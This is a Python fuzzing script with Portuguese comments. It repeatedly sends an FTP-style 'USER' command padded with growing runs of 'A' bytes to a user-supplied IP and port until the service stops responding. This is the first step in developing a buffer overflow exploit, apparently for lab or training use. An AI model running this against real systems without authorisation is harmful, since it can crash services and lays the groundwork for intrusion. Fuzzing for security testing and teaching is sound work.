import socket
import time

def fuzzing(ip, port, increment):
    fuzz = ""
    
    while True:
        # Adiciona o incremento de bytes à variável "fuzz"
        fuzz += "A" * increment
        print(f"[+] Enviando {len(fuzz)} bytes para {ip}:{port}")
        
        try:
            # Cria um socket TCP e tenta conectar ao IP e Porta fornecidos
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((ip, port))
            
            # Recebe a resposta inicial do servidor
            s.recv(1024)
            
            # Envia o payload com os bytes incrementados
            s.send(b"USER " + fuzz.encode() + b"\r\n")
            print(s.recv(1024))
            
            # Envia o comando para encerrar a conexão
            s.send(b"QUIT\r\n")
            s.close()
        except socket.error as e:
            print(f"[!] Erro de conexão: {e}")
            break
        except KeyboardInterrupt:
            print("\n[!] Fuzzing interrompido pelo usuário.")
            break
        
        time.sleep(1)

# Solicita informações do usuário
def get_user_input():
    try:
        ip = input("Digite o IP do alvo: ")
        port = int(input("Digite a porta do alvo: "))
        increment = int(input("Digite o incremento de bytes (ex: 200): "))
        return ip, port, increment
    except ValueError:
        print("[!] Entrada inválida. Certifique-se de que todos os valores estão corretos.")
        return get_user_input()

if __name__ == "__main__":
    print("=== Fuzzing para Buffer Overflow ===")
    ip, port, increment = get_user_input()
    fuzzing(ip, port, increment)
